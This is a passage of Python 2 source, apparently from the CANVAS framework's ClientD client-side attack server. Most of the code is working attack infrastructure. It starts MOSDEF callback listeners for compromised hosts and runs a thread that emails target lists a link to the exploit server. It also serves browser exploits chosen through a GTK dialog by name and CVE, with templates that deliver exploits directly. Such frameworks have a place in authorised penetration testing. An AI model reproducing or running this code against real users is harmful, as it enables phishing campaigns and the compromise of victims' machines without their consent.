        http_mosdef_listener    = None
        http_mosdef_type        = ''

        logging.info('ClientD using HTTP MOSDEF listener ...')

        if self.useSSLMOSDEF:
            http_mosdef_type = HTTPMOSDEF_SSL
        else:
            http_mosdef_type = HTTPMOSDEF

        http_mosdef_listener = self.engine.autoListener(self, http_mosdef_type,
                                                        host=self.callback.ip,
                                                        autoFind=False,
                                                        HTTPPROXYPORT = self.httpproxyport)
        if not http_mosdef_listener:
            logging.error('Could not start HTTP MOSDEF listener')
            logging.error("Something is possibly listening on that port (%d) already?" % self.httpproxyport)
            return '', None
        else:
            logging.info("Started up HTTP MOSDEF listener!")

        #set our internal variable here.
        self.http_mosdef_listener = http_mosdef_listener
        return http_mosdef_type, http_mosdef_listener

    def init_spammer(self, ssl = False):
        """ init the spammer worker thread """
        if self.spam == True:

            smtp_server = ""
            smtp_port   = ""
            mxresolve   = True

            try:
                smtp_server = self.engine.config['preferred_smtp_host']
                smtp_port   = int(self.engine.config['preferred_smtp_port'])
                mxresolve   = self.engine.config['mxresolve']
            except Exception, e:
                pass

            logging.info('Spamming out emails ...')
            if self.server_domain:
                host = self.server_domain
            else:
                host = self.callback.ip
            if ssl == True:
                proto = 'https'
            else:
                proto = 'http'
            if self.server_port not in [80]:
                uri = '%s://%s:%d' % (proto, host, self.server_port)
            else:
                uri = '%s://%s' % (proto, host)
            try:
                self.spammer = Spammer(uri, self.spam_targets,
                    smtp_server=smtp_server, smtp_port=smtp_port, mxresolve=mxresolve)
                if self.spam_from:
                    self.spammer.mail_from = self.spam_from
                if self.spam_subject:
                    self.spammer.subject = self.spam_subject
                if self.spam_template:
                    self.spammer.spam = self.spam_template
                if self.file_choose:
                    self.spammer.file = self.file_choose
                self.spammer.start()
            except Exception:
                logging.error('Could not start spammer thread')
                self.spammer = None
                return False
        return True

    def make_server(self, ssl=False):
        logging.info("Using server listen queue of size: %d" % self.listen_queue)

        if ssl:
            logging.info("Setting up SSL Enabled HTTP Server on %s:%s" % (self.server_ip, self.server_port))
            ServerClass = MyHTTPSServer
        else:
            logging.info("Setting up HTTP Server on %s:%s" % (self.server_ip, self.server_port))
            ServerClass = MyHTTPServer

        try:
            self.httpd = ServerClass((self.server_ip, self.server_port),
                                MyRequestHandler,
                                listen_queue=self.listen_queue,
                                cookie_name=self.session_cookie_name)
        except Exception:
            import traceback
            traceback.print_exc(file=sys.stderr)
            logging.error("Cannot listen on %s:%s" % (self.server_ip, self.server_port))
            return False

        if ssl:
            self.httpd.setup_ssl(self.ssl_cert, self.ssl_key)

        self.httpd.set_app(ClientSider(self.loader,
                                       access_logger = self.access_log,
                                       log = self.log,
                                       spammer = self.spammer,
                                       static_dir = self.static_dir,
                                       exit_redirect = self.exit_redirect,
                                       response_template = self.response_template,
                                       engine=self.engine,
                                       clientd=self))

        return True

    def getBaseURL(self):
        """
        Gets a base URL for use by exploits that need to call back to us
        self.sessionstate.loader.canvasobj.getBaseURL() is how an exploit would use this method.
        """

        if self.useSSL:
            protocol = "https"
        else:
            protocol = "http"

        if self.server_port != 80:
            portstr = ":"+str(self.server_port)
        else:
            portstr = ""

        if self.server_domain:
            base = self.server_domain
        else:
            base = self.server_ip

        if base == '0.0.0.0':
            # That is the case when running on a NAT interface
            base = self.callback.ip

        ret = protocol + "://"+base+portstr+"/"
        return ret

    def run(self):
        """ init args and start server run """
        self.setInfo('%s initializing arguments ...' % NAME)
        self.get_args()

        # check for proper exit redirect to prevent IE request madness on 302
        if self.exit_redirect and not self.exit_redirect.lower().startswith(('http://', 'https://')):
            logging.error('End of session redirects have to be formatted with http:// or https://')
            return False

        # dump gui config to commandline so you can save it for headless usage ...
        self.dump_cmdline()

        if not self.callback:
            logging.error("You need a callback for this exploit")
            return False

        # Check if it's NAT'd
        newinterface = self.engine.localnode.getMatchingInterface(self.callback.ip)
        if newinterface and newinterface.isNAT:
            self.server_ip = "0.0.0.0"

        if not self.server_ip:
            # default to the ip we bind our server on ...
            self.server_ip = self.callback.ip

        # init the loader here to prevent gui lag ...
        self.loader = ModuleLoaderC6(self, allowed=self.allowed_attack_modules,
            recon=self.recon, domain=self.server_domain,
            auto_detect_exploits=self.auto_detect_exploits, log=self.log)
        if self.auto_detect_exploits:
            devlog("clientd", "Using autodetect list instead of specified list of allowed exploits")
            self.allowed_attack_modules = self.loader.available.keys()

        #even if spammer has not been chosen, they may want to do this later - so we always start up
        logging.info('Starting spammer worker thread')
        self.setInfo('%s starting spammer ...' % NAME)
        self.init_spammer(ssl=self.useSSL)

        logging.info('Starting WSGI ClientD application ...')
        self.setInfo('%s starting ClientD ...' % NAME)
        ret = self.make_server(ssl=self.useSSL)
        if not ret:
            logging.error("Exiting ClientD")
            return False

        devlog("clientd", "If we need to start an DNS Listener - do so now")
        if self.dnsmosdef:
            self.init_dns_mosdef()
            if not self.dns_mosdef_listener:
                logging.error("Failed to start an DNS MOSDEF Listener even though one was requested - Exiting")
                return False

        devlog("clientd", "If we need to start an HTTP Listener - do so now")
        if self.httpmosdef:
            self.init_http_mosdef()
            if not self.http_mosdef_listener:
                logging.error("Failed to start an HTTP MOSDEF Listener on port %s even though one was requested - Exiting"%self.httpproxyport)
                return False

        self.setInfo('%s started on %s:%s...' % (NAME, self.server_ip, self.server_port))
        self.httpd.timeout = 2
        while self.state != self.HALT:
            self.httpd.handle_request() # single request

        # explicitly kill listening sockets here
        logging.info("Closing our HTTP Server")
        self.httpd.server_close()
        self.httpd = None # use garbage collector to remove our socket, if necessary
        # done explicitly killing listening sockets (using the magic of garbage collection)

        # be nice ...
        if self.spammer:
            logging.info("Waiting for spammer thread to finish")
            self.spammer.end_spammer()
            self.spammer.join()
            logging.info("Spammer thread finished")
        self.setInfo('%s ClientD finished ...' % NAME)

        # XXX: penciling this in ...
        #for thread in self.custom_threads:
        #    if hasattr(thread, 'halt'):
        #        try:
        #            logging.info('Halting custom thread ...')
        #            thread.halt()
        #            thread.join()
        #        except Exception:
        #            logging.error('Could not halt custom thread ...')

        return True

def set_module_selection(wtree):
    modules = wtree.get_widget('allowed_attack_modules')
    auto_detect = wtree.get_widget('auto_detect_exploits')
    if not auto_detect.get_active():
        view = wtree.get_widget('module_tree')
        model = view.get_model()

        names = []
        for row in model:
            enabled, name, cve, desc, module = row
            if enabled:
                names.append(name)

        modules.set_text(','.join(names))
    else:
        modules.set_text('')

def select_path(b, gtk, dialog, action, widget):
    dialog = gtk.FileChooserDialog('Select filename...', dialog, action,
        (gtk.STOCK_CANCEL, gtk.RESPONSE_CANCEL, gtk.STOCK_OPEN, gtk.RESPONSE_OK))
    try:
        dialog.set_filename(widget.get_text())

        if dialog.run() == gtk.RESPONSE_OK:
            fname = dialog.get_filename()
            widget.set_text(fname)
    finally:
        dialog.destroy()

def dialog_update(gtk, wtree):
    # set dialog defaults and connect signals
    import pango
    from gui.text_with_markup import insert_text_with_markup

    dialog = wtree.get_widget('exploit_dialog')
    signal_ids = []

    doc_dialog = wtree.get_widget('doc_dialog')
    def on_delete(*args):
        doc_dialog.hide()
        return True
    sig = doc_dialog.connect('delete-event', on_delete)
    signal_ids.append((doc_dialog, sig))
    doc_button = wtree.get_widget('doc_button')
    sig = doc_button.connect('clicked', lambda x: doc_dialog.hide())
    signal_ids.append((doc_button, sig))

    # server ip
    server_ip = wtree.get_widget('server_ip')
    callback_host = wtree.get_widget('callback_host')
    server_ip.set_text(callback_host.get_text())

    # autodetect
    always_do_recon = wtree.get_widget('always_do_recon')
    select_all_button = wtree.get_widget('select_all_exploits_button')
    select_none_button = wtree.get_widget('select_none_exploits_button')
    modules_entry = wtree.get_widget('allowed_attack_modules')
    def on_toggle_auto_detect(button, *widgets):
        enabled = button.get_active()
        for widget in widgets:
            widget.set_sensitive(not enabled)
        set_module_selection(wtree)
    auto_detect_exploits = wtree.get_widget('auto_detect_exploits')
    auto_detect_scrolledwindow = wtree.get_widget('auto_detect_scrolledwindow')
    sig = auto_detect_exploits.connect('toggled', on_toggle_auto_detect,
        auto_detect_scrolledwindow, modules_entry,
        select_all_button, select_none_button, always_do_recon)
    signal_ids.append((auto_detect_exploits, sig))

    # modules
    modules = []
    view = wtree.get_widget('module_tree')
    model = view.get_model()
    if not model:
        # only add model and columns the first time
        # enabled, name, CVE, description, module
        model = gtk.TreeStore(bool, str, str, str, object)
        view.set_model(model)

        def on_activated(view, path, column, model, buffer):
            module = model[path][4]
            doc = canvasengine.html_docs_from_module(module)
            buffer.set_text('')
            insert_text_with_markup(buffer, doc[0])
            doc_dialog.show_all()
        buffer = wtree.get_widget('doc_view').get_buffer()
        view.connect('row-activated', on_activated, model, buffer)

        def on_toggled(render, path, model, column):
            model[path][column] = not model[path][column]
            set_module_selection(wtree)
        render = gtk.CellRendererToggle()
        render.set_property('activatable', True)
        render.connect('toggled', on_toggled, model, 0)
        column = gtk.TreeViewColumn('x', render, active=0)
        view.append_column(column)

        render = gtk.CellRendererText()
        column = gtk.TreeViewColumn('Exploit', render, text=1)
        column.set_resizable(True)
        column.set_expand(True)
        view.append_column(column)

        render = gtk.CellRendererText()
        column = gtk.TreeViewColumn('CVE', render, text=2)
        column.set_resizable(True)
        column.set_expand(True)
        view.append_column(column)

        render = gtk.CellRendererText()
        column = gtk.TreeViewColumn('Description', render, text=3)
        column.set_resizable(True)
        column.set_expand(True)
        view.append_column(column)
    else:
        modules = modules_entry.get_text().split(',')
        modules = [m for m in map(str.strip, modules) if m]

    if not modules:
        modules = read_modules_file(name='new')
        modules.extend(read_modules_file(name='favorite'))
        modules.extend(DEFAULT_ATTACK_MODULES)
    modules = set(modules)

    loader = ModuleLoaderC6(None)
    model.clear()
    for name, module in sorted(loader.get_all_modules().items()):
        p = getattr(module, 'PROPERTY', {})
        p.update(getattr(module, 'DOCUMENTATION', {}))
        cve = p.get('CVE Name', '')
        if not cve:
            cve = p.get('CVE', '')
        model.append(None, [name in modules, name, cve, module.DESCRIPTION, module])
    set_module_selection(wtree)

    def on_entry_changed(entry, model):
        modules = entry.get_text().split(',')
        modules = set([m for m in map(str.strip, modules) if m])
        for row in model:
            row[0] = row[1] in modules
    sig = modules_entry.connect('changed', on_entry_changed, model)
    signal_ids.append((modules_entry, sig))

    # module selection
    def on_clicked(button, model, enabled):
        for row in model:
            row[0] = enabled
        set_module_selection(wtree)
    sig = select_all_button.connect('clicked', on_clicked, model, True)
    signal_ids.append((select_all_button, sig))
    sig = select_none_button.connect('clicked', on_clicked, model, False)
    signal_ids.append((select_none_button, sig))

    # SSL
    widget = wtree.get_widget('ssl_cert')
    widget.set_text(os.path.abspath('Resources/server.cert'))
    button = wtree.get_widget('ssl_cert_button')
    sig = button.connect('clicked', select_path, gtk, dialog,
        gtk.FILE_CHOOSER_ACTION_OPEN, widget)
    signal_ids.append((button, sig))

    widget = wtree.get_widget('ssl_key')
    widget.set_text(os.path.abspath('Resources/server.pkey'))
    button = wtree.get_widget('ssl_key_button')
    sig = button.connect('clicked', select_path, gtk, dialog,
        gtk.FILE_CHOOSER_ACTION_OPEN, widget)
    signal_ids.append((button, sig))

    def on_toggle_ssl(button, frame):
        enabled = button.get_active()
        frame.set_sensitive(enabled)
    enable_ssl = wtree.get_widget('useSSL')
    enable_ssl_frame = wtree.get_widget('enable_ssl_frame')
    sig = enable_ssl.connect('toggled', on_toggle_ssl, enable_ssl_frame)
    signal_ids.append((enable_ssl, sig))

    # response template
    response_radio = wtree.get_widget('response_template_radio')
    javascript_radio = wtree.get_widget('javascript_radio')
    direct_radio = wtree.get_widget('direct_response_radio')

    response_template = wtree.get_widget('response_template')

    def on_toggle_response(radio, response_template, type):
        buf = response_template.get_buffer()
        active = radio.get_active()
        response_template.set_sensitive(True)
        if type == 'response' and active:
            buf.set_text(DEFAULT_RESPONSE_TEMPLATE)
        elif type == 'javascript' and active:
            buf.set_text(JAVASCRIPT_RESPONSE_TEMPLATE)
        elif type == 'direct' and active:
            buf.set_text(EXPLOIT_RESPONSE_TEMPLATE)
            response_template.set_sensitive(False)

    sig = response_radio.connect('toggled', on_toggle_response,
        response_template, 'response')
    signal_ids.append((response_radio, sig))
    sig = javascript_radio.connect('toggled', on_toggle_response,
        response_template, 'javascript')
    signal_ids.append((javascript_radio, sig))
    sig = direct_radio.connect('toggled', on_toggle_response,
        response_template, 'direct')
    signal_ids.append((direct_radio, sig))

    buf = response_template.get_buffer()
    response_template.modify_font(pango.FontDescription('monospace 9'))
    if not buf.get_text(buf.get_start_iter(), buf.get_end_iter()):
        buf.set_text(DEFAULT_RESPONSE_TEMPLATE)

    # redirect
    def on_redirect_toggled(button, widget):
        enabled = button.get_active()
        widget.set_sensitive(enabled)
    redirect = wtree.get_widget('redirect')
    exit_redirect = wtree.get_widget('exit_redirect')
    sig = redirect.connect('toggled', on_redirect_toggled, exit_redirect)
    signal_ids.append((redirect, sig))

    # spammer
    def on_toggle_spam(button, frame):
        enabled = button.get_active()
        frame.set_sensitive(enabled)
    spam = wtree.get_widget('spam')
    spam_frame = wtree.get_widget('spam_frame')
    sig = spam.connect('toggled', on_toggle_spam, spam_frame)
    signal_ids.append((spam, sig))

    def disconnect(w):
        for w, sig in signal_ids:
            w.disconnect(sig)
    sig = dialog.connect('hide', disconnect)
    signal_ids.append((dialog, sig))

if __name__ == '__main__':
    app         = theexploit()
    ret         = standard_callback_commandline(app)
